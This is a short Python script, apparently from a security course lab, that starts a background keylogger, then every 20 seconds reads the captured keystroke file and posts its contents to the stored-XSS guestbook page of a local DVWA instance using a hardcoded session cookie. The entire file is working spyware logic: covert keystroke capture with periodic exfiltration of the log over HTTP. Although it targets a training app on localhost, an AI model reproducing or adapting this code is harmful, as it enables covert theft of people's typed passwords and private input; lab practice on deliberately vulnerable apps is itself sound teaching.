#!/bin/python3

import requests
import time
import os 
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/isaiah/ITP270_001N_FALL2022/Python_Learning/keylogger.py & ")
time.sleep(1)

def send_request():
    cookies = {'PHPSESSID':'u011e9l0t5le0na9rh6ddtc0j2', 'security':'low'}
    url='http://127.0.0.1/DVWA/vulnerabilities/xss_s/' 
    form_input = open("/home/isaiah/ITP270_001N_FALL2022/Python_Learning/keyboard_Input.txt") 
    form_send = form_input.read() 
    form_data = {'txtName':'Test IT', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}   
    r = requests.post(url, cookies=cookies, data=form_data) 

def interval():
    global startlog
    if time.time() - 20 > startlog:
        print('its been 20 secs ')
        send_request()
        startlog = time.time()

counter = 0
while True:
    counter += 1
    print(counter)
    interval()
    time.sleep(1)